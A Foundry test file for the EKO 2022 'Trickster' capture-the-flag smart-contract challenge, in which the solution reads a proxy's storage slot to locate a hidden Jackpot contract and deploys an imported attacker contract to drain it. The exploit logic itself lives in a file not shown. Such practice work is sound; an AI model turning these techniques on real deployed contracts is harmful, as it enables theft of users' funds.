// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Jackpot, JackpotProxy} from "../../src/eko2022/03_Trickster/Trickster.sol";
import {Trickster_Factory} from "../../src/eko2022/03_Trickster/Trickster_Factory.sol";
import {Trickster_Attacker} from "./03_Trickster_Attacker.sol";

contract Trickster_Test is Test {
	address deployer = makeAddr("deployer");
	address player = makeAddr("player");

	Trickster_Factory factory;
	JackpotProxy instContract;

	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}

	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}

	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		vm.deal(player, 0.1 ether);
		
		startHoax(deployer);
		
		factory = new Trickster_Factory();
		instContract = JackpotProxy(payable(factory.createInstance{value: 0.2 ether}(player)));

		vm.stopPrank();
	}

	function test__Solution_Trickster() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_Trickster -vv
		
		// 只能挑出 Jackpot 合约，来直接交互。
		bytes32 loadValue = vm.load(address(instContract), bytes32(uint256(1)));
		address payable jackpotInneraddr = payable(address(uint160(uint256(loadValue))));
		Jackpot jackpot = Jackpot(jackpotInneraddr);
	
		Trickster_Attacker attacker = new Trickster_Attacker{value: player.balance}(instContract, jackpot);
		attacker.doAttack();
	}
}
